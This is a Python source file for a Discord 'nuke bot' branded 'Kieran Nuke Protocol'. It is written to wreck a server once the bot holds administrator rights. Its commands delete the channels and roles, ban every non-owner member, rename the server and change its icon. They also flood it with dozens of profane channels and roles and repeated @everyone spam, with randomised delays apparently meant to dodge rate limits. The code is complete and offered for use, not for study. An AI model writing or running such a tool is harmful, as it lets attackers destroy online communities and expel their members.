import discord
from discord.ext import commands
import asyncio
import random
import logging
import os

intents = discord.Intents.all()
# Fallback if intents not enabled
intents.members = True
intents.message_content = True
intents.presences = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

TOKEN = os.getenv("TOKEN")

if not TOKEN:
    print("ERROR: TOKEN environment variable not set!")
    exit(1)

@bot.event
async def on_ready():
    print(f"[{bot.user}] Advanced Nuke Bot Online - Protocol Zero Active")
    await bot.change_presence(activity=discord.Game(name="Kieran Nuke Protocol"))

# Rest of the code remains the same as before...
async def set_kieran_icon(guild):
    try:
        with open("kieran_icon.jpg", "rb") as f:
            await guild.edit(icon=f.read(), reason="Kieran Nuke")
        logging.info("Server icon updated to Kieran")
    except Exception as e:
        logging.error(f"Icon change failed: {e}")

async def safe_delete(obj, delay=0):
    try:
        await obj.delete()
        if delay:
            await asyncio.sleep(delay)
    except:
        pass

async def safe_ban(member, delay=0):
    try:
        await member.ban(reason="Nuke by Kieran", delete_message_days=1)
        if delay:
            await asyncio.sleep(delay)
    except:
        pass

@bot.command()
@commands.has_permissions(administrator=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    logging.info(f"Starting channel nuke on {guild.name}")
    for ch in list(guild.channels):
        await safe_delete(ch, random.uniform(0.8, 1.6))
    for i in range(40):
        try:
            cat = await guild.create_category(f"fucked-by-kieran-{i}")
            await guild.create_text_channel("fucked-by-kieran", category=cat)
            await asyncio.sleep(random.uniform(0.6, 1.4))
        except:
            pass
    logging.info("Channels phase complete")

@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    members = list(guild.members)
    random.shuffle(members)
    logging.info(f"Starting ban wave on {len(members)} members")
    for member in members:
        if member != guild.owner and member != bot.user and not member.bot:
            await safe_ban(member, random.uniform(0.9, 2.0))
    logging.info("Ban phase complete")

@bot.command()
@commands.has_permissions(administrator=True)
async def roles(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for role in reversed(list(guild.roles)):
        if role != guild.default_role and role != guild.me.top_role:
            await safe_delete(role, random.uniform(0.7, 1.5))
    for _ in range(80):
        try:
            await guild.create_role(name="fucked by Kieran", colour=discord.Colour.random(), reason="Kieran Nuke")
            await asyncio.sleep(random.uniform(0.5, 1.1))
        except:
            pass
    logging.info("Roles phase complete")

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx, *, text: str = "fucked by Kieran - Protocol Zero"):
    await ctx.message.delete()
    guild = ctx.guild
    logging.info("Starting spam phase")
    for channel in guild.text_channels:
        for _ in range(25):
            try:
                await channel.send(f"@everyone {text}")
                await asyncio.sleep(random.uniform(0.6, 1.3))
            except:
                pass
    logging.info("Spam phase complete")

@bot.command()
@commands.has_permissions(administrator=True)
async def servername(ctx, *, name: str = "NUKED BY KIERAN"):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(name=name)
        logging.info("Server name changed")
    except:
        pass

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.send("🚀 **FULL KIERAN NUKE PROTOCOL ACTIVATED** - ALL SYSTEMS GO")
    guild = ctx.guild
    await set_kieran_icon(guild)
    await asyncio.sleep(1)
    tasks = [roles(ctx), channels(ctx), ban(ctx), servername(ctx)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await spam(ctx)
    await ctx.send("@everyone **SERVER HAS BEEN FUCKED BY KIERAN**")
    logging.info("FULL NUKE SEQUENCE COMPLETE")

@bot.command()
@commands.has_permissions(administrator=True)
async def status(ctx):
    await ctx.message.delete()
    await ctx.send(f"**Kieran Nuke Bot Active**\nGuild: {ctx.guild.name}\nMembers: {len(ctx.guild.members)}")

bot.run(TOKEN)
